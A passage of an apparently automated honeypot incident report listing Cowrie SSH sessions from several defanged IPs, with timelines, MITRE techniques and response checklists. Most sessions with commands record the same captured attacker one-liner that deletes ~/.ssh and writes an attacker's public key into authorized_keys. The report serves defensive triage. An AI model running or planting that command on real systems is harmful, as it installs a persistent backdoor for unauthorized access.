| `2026-06-02 20:15:46` | `cowrie.client.kex` |
| `2026-06-02 20:15:47` | `cowrie.login.success` |
| `2026-06-02 20:15:48` | `cowrie.session.params` |
| `2026-06-02 20:15:48` | `cowrie.command.input` |
| `2026-06-02 20:15:48` | `cowrie.command.failed` |
| `2026-06-02 20:15:48` | `cowrie.log.closed` |
| `2026-06-02 20:15:49` | `cowrie.session.params` |
| `2026-06-02 20:15:49` | `cowrie.command.input` |
| `2026-06-02 20:15:49` | `cowrie.session.file_download` |
| `2026-06-02 20:15:49` | `cowrie.log.closed` |
| `2026-06-02 20:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.142.2[.]40` to AbuseIPDB if not already reported
- [ ] Block `192.142.2[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c87f36037ab6

| Field | Detail |
|---|---|
| **Source IP** | `192.142.2[.]40` |
| **First Seen** | 2026-06-02 20:15 |
| **Last Seen** | 2026-06-02 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:15:52` | `cowrie.session.connect` |
| `2026-06-02 20:15:52` | `cowrie.client.version` |
| `2026-06-02 20:15:53` | `cowrie.client.kex` |
| `2026-06-02 20:15:54` | `cowrie.login.success` |
| `2026-06-02 20:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.142.2[.]40` to AbuseIPDB if not already reported
- [ ] Block `192.142.2[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d5a76cd0f4

| Field | Detail |
|---|---|
| **Source IP** | `200.236.4[.]245` |
| **First Seen** | 2026-06-02 20:25 |
| **Last Seen** | 2026-06-02 20:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:25:51` | `cowrie.session.connect` |
| `2026-06-02 20:25:51` | `cowrie.client.version` |
| `2026-06-02 20:25:52` | `cowrie.client.kex` |
| `2026-06-02 20:25:53` | `cowrie.login.success` |
| `2026-06-02 20:25:54` | `cowrie.session.params` |
| `2026-06-02 20:25:54` | `cowrie.command.input` |
| `2026-06-02 20:25:54` | `cowrie.command.failed` |
| `2026-06-02 20:25:55` | `cowrie.log.closed` |
| `2026-06-02 20:25:55` | `cowrie.session.params` |
| `2026-06-02 20:25:55` | `cowrie.command.input` |
| `2026-06-02 20:25:55` | `cowrie.session.file_download` |
| `2026-06-02 20:25:55` | `cowrie.log.closed` |
| `2026-06-02 20:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.236.4[.]245` to AbuseIPDB if not already reported
- [ ] Block `200.236.4[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-050f6f7b109a

| Field | Detail |
|---|---|
| **Source IP** | `200.236.4[.]245` |
| **First Seen** | 2026-06-02 20:25 |
| **Last Seen** | 2026-06-02 20:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:25:59` | `cowrie.session.connect` |
| `2026-06-02 20:25:59` | `cowrie.client.version` |
| `2026-06-02 20:26:00` | `cowrie.client.kex` |
| `2026-06-02 20:26:01` | `cowrie.login.success` |
| `2026-06-02 20:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.236.4[.]245` to AbuseIPDB if not already reported
- [ ] Block `200.236.4[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a85f53462f

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 20:32 |
| **Last Seen** | 2026-06-02 20:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:32:14` | `cowrie.session.connect` |
| `2026-06-02 20:32:14` | `cowrie.client.version` |
| `2026-06-02 20:32:14` | `cowrie.client.kex` |
| `2026-06-02 20:32:15` | `cowrie.login.success` |
| `2026-06-02 20:32:16` | `cowrie.session.params` |
| `2026-06-02 20:32:16` | `cowrie.command.input` |
| `2026-06-02 20:32:16` | `cowrie.command.failed` |
| `2026-06-02 20:32:16` | `cowrie.log.closed` |
| `2026-06-02 20:32:17` | `cowrie.session.params` |
| `2026-06-02 20:32:17` | `cowrie.command.input` |
| `2026-06-02 20:32:17` | `cowrie.session.file_download` |
| `2026-06-02 20:32:17` | `cowrie.log.closed` |
| `2026-06-02 20:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9992c0ea0129

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 20:32 |
| **Last Seen** | 2026-06-02 20:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:32:20` | `cowrie.session.connect` |
| `2026-06-02 20:32:20` | `cowrie.client.version` |
| `2026-06-02 20:32:20` | `cowrie.client.kex` |
| `2026-06-02 20:32:21` | `cowrie.login.success` |
| `2026-06-02 20:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c70aeff43bab

| Field | Detail |
|---|---|
| **Source IP** | `8.154.4[.]21` |
| **First Seen** | 2026-06-02 20:33 |
| **Last Seen** | 2026-06-02 20:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:33:22` | `cowrie.session.connect` |
| `2026-06-02 20:33:22` | `cowrie.client.version` |
| `2026-06-02 20:33:22` | `cowrie.client.kex` |
| `2026-06-02 20:33:22` | `cowrie.login.success` |
| `2026-06-02 20:33:22` | `cowrie.session.params` |
| `2026-06-02 20:33:22` | `cowrie.command.input` |
| `2026-06-02 20:33:22` | `cowrie.command.failed` |
| `2026-06-02 20:33:23` | `cowrie.log.closed` |
| `2026-06-02 20:33:23` | `cowrie.session.params` |
| `2026-06-02 20:33:23` | `cowrie.command.input` |
| `2026-06-02 20:33:23` | `cowrie.session.file_download` |
| `2026-06-02 20:33:23` | `cowrie.log.closed` |
| `2026-06-02 20:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.4[.]21` to AbuseIPDB if not already reported
- [ ] Block `8.154.4[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-126f80a2e262

| Field | Detail |
|---|---|
| **Source IP** | `8.154.4[.]21` |
| **First Seen** | 2026-06-02 20:33 |
| **Last Seen** | 2026-06-02 20:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:33:25` | `cowrie.session.connect` |
| `2026-06-02 20:33:25` | `cowrie.client.version` |
| `2026-06-02 20:33:25` | `cowrie.client.kex` |
| `2026-06-02 20:33:26` | `cowrie.login.success` |
| `2026-06-02 20:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.4[.]21` to AbuseIPDB if not already reported
- [ ] Block `8.154.4[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1ef246530bb

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 20:37 |
| **Last Seen** | 2026-06-02 20:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:37:52` | `cowrie.session.connect` |
| `2026-06-02 20:37:52` | `cowrie.client.version` |
| `2026-06-02 20:37:53` | `cowrie.client.kex` |
| `2026-06-02 20:37:54` | `cowrie.login.success` |
| `2026-06-02 20:37:54` | `cowrie.session.params` |
| `2026-06-02 20:37:54` | `cowrie.command.input` |
| `2026-06-02 20:37:54` | `cowrie.command.failed` |
| `2026-06-02 20:37:55` | `cowrie.log.closed` |
| `2026-06-02 20:37:55` | `cowrie.session.params` |
| `2026-06-02 20:37:55` | `cowrie.command.input` |
| `2026-06-02 20:37:55` | `cowrie.session.file_download` |
| `2026-06-02 20:37:55` | `cowrie.log.closed` |
| `2026-06-02 20:38:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-503bb0bb48a1

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 20:37 |
| **Last Seen** | 2026-06-02 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:37:58` | `cowrie.session.connect` |
| `2026-06-02 20:37:58` | `cowrie.client.version` |
| `2026-06-02 20:37:59` | `cowrie.client.kex` |
| `2026-06-02 20:38:00` | `cowrie.login.success` |
| `2026-06-02 20:38:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda039223d41

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 20:38 |
| **Last Seen** | 2026-06-02 20:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:38:28` | `cowrie.session.connect` |
| `2026-06-02 20:38:28` | `cowrie.client.version` |
| `2026-06-02 20:38:28` | `cowrie.client.kex` |
| `2026-06-02 20:38:29` | `cowrie.login.success` |
| `2026-06-02 20:38:30` | `cowrie.session.params` |
| `2026-06-02 20:38:30` | `cowrie.command.input` |
| `2026-06-02 20:38:30` | `cowrie.command.failed` |
| `2026-06-02 20:38:31` | `cowrie.log.closed` |
| `2026-06-02 20:38:31` | `cowrie.session.params` |
| `2026-06-02 20:38:31` | `cowrie.command.input` |
| `2026-06-02 20:38:31` | `cowrie.session.file_download` |
| `2026-06-02 20:38:31` | `cowrie.log.closed` |
| `2026-06-02 20:38:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c5cedcfb32

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 20:38 |
| **Last Seen** | 2026-06-02 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:38:35` | `cowrie.session.connect` |
| `2026-06-02 20:38:35` | `cowrie.client.version` |
| `2026-06-02 20:38:35` | `cowrie.client.kex` |
| `2026-06-02 20:38:37` | `cowrie.login.success` |
| `2026-06-02 20:38:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac909a76e5d4

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:38 |
| **Last Seen** | 2026-06-02 20:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:38:40` | `cowrie.session.connect` |
| `2026-06-02 20:38:40` | `cowrie.client.version` |
| `2026-06-02 20:38:40` | `cowrie.client.kex` |
| `2026-06-02 20:38:41` | `cowrie.login.success` |
| `2026-06-02 20:38:41` | `cowrie.session.params` |
| `2026-06-02 20:38:41` | `cowrie.command.input` |
| `2026-06-02 20:38:41` | `cowrie.command.failed` |
| `2026-06-02 20:38:41` | `cowrie.log.closed` |
| `2026-06-02 20:38:41` | `cowrie.session.params` |
| `2026-06-02 20:38:41` | `cowrie.command.input` |
| `2026-06-02 20:38:41` | `cowrie.session.file_download` |
| `2026-06-02 20:38:41` | `cowrie.log.closed` |
| `2026-06-02 20:38:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b2a56c59482

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:38 |
| **Last Seen** | 2026-06-02 20:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:38:44` | `cowrie.session.connect` |
| `2026-06-02 20:38:44` | `cowrie.client.version` |
| `2026-06-02 20:38:44` | `cowrie.client.kex` |
| `2026-06-02 20:38:44` | `cowrie.login.success` |
| `2026-06-02 20:38:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d50f995ca135

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:40 |
| **Last Seen** | 2026-06-02 20:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:40:21` | `cowrie.session.connect` |
| `2026-06-02 20:40:21` | `cowrie.client.version` |
| `2026-06-02 20:40:21` | `cowrie.client.kex` |
| `2026-06-02 20:40:22` | `cowrie.login.success` |
| `2026-06-02 20:40:22` | `cowrie.session.params` |
| `2026-06-02 20:40:22` | `cowrie.command.input` |
| `2026-06-02 20:40:22` | `cowrie.command.failed` |
| `2026-06-02 20:40:22` | `cowrie.log.closed` |
| `2026-06-02 20:40:22` | `cowrie.session.params` |
| `2026-06-02 20:40:22` | `cowrie.command.input` |
| `2026-06-02 20:40:22` | `cowrie.session.file_download` |
| `2026-06-02 20:40:22` | `cowrie.log.closed` |
| `2026-06-02 20:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e19746ac4d0

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:40 |
| **Last Seen** | 2026-06-02 20:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:40:25` | `cowrie.session.connect` |
| `2026-06-02 20:40:25` | `cowrie.client.version` |
| `2026-06-02 20:40:25` | `cowrie.client.kex` |
| `2026-06-02 20:40:25` | `cowrie.login.success` |
| `2026-06-02 20:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ae8ae9b0380

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:41 |
| **Last Seen** | 2026-06-02 20:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:41:56` | `cowrie.session.connect` |
| `2026-06-02 20:41:56` | `cowrie.client.version` |
| `2026-06-02 20:41:56` | `cowrie.client.kex` |
| `2026-06-02 20:41:57` | `cowrie.login.success` |
| `2026-06-02 20:41:57` | `cowrie.session.params` |
| `2026-06-02 20:41:57` | `cowrie.command.input` |
| `2026-06-02 20:41:57` | `cowrie.command.failed` |
| `2026-06-02 20:41:58` | `cowrie.log.closed` |
| `2026-06-02 20:41:58` | `cowrie.session.params` |
| `2026-06-02 20:41:58` | `cowrie.command.input` |
| `2026-06-02 20:41:58` | `cowrie.session.file_download` |
| `2026-06-02 20:41:58` | `cowrie.log.closed` |
| `2026-06-02 20:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ef91f2d2aba

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:42 |
| **Last Seen** | 2026-06-02 20:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:42:00` | `cowrie.session.connect` |
| `2026-06-02 20:42:00` | `cowrie.client.version` |
| `2026-06-02 20:42:00` | `cowrie.client.kex` |
| `2026-06-02 20:42:01` | `cowrie.login.success` |
| `2026-06-02 20:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
